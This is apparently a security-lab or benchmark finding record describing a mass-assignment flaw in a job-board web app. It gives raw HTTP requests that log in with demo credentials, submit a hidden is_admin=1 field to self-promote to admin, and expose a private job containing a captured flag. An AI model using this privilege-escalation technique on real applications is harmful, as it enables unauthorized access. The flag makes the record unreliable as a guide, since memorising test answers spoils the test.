input.title: Profile update mass assignment allows regular company user to self-promote to admin and view private jobs
input.evidence_request:
1) Authenticate as the documented low-privileged demo company account:
POST /token HTTP/1.1
Host: localhost:32769
Content-Type: application/x-www-form-urlencoded

username=demo&password=demo

Response sets a Bearer JWT cookie and redirects to /company/1/jobs.

2) Baseline: as this regular user, the edit profile page shows Admin Status disabled and Regular selected:
GET /edit_profile/1 HTTP/1.1
Cookie: access_token="Bearer <demo JWT>"

3) Exploit: submit the disabled/hidden is_admin field anyway:
POST /edit_profile/1 HTTP/1.1
Host: localhost:32769
Cookie: access_token="Bearer <demo JWT>"
Content-Type: application/x-www-form-urlencoded

name=demo&is_admin=1

4) Verify elevated impact:
GET /company/1/jobs HTTP/1.1
Cookie: access_token="Bearer <same demo JWT>"
input.evidence_response:
Login response: HTTP/1.1 303 See Other location: /company/1/jobs set-cookie: access_token="Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."; HttpOnly; Path=/; SameSite=lax Pre-exploit profile form showed the admin control was client-side disabled: Exploit response: HTTP/1.1 200 OK ...
Profile updated successfully
Post-exploit private data exposure on /company/1/jobs: HTTP/1.1 200 OK ...

  • secret:FLAG{6809314cbc866c8ff2005a9c}
input.evidence_analysis: The application relies on a disabled HTML form control to prevent regular users from modifying the `is_admin` role attribute, but the server accepts and persists `is_admin=1` from the POST body. A low-privileged authenticated company can therefore self-promote to admin. After self-promotion the same session can view job data that was not visible before, including a private/secret job entry. This is a server-side authorization and mass-assignment flaw; role changes must not be accepted from untrusted profile update requests unless the caller is authorized to grant that role.
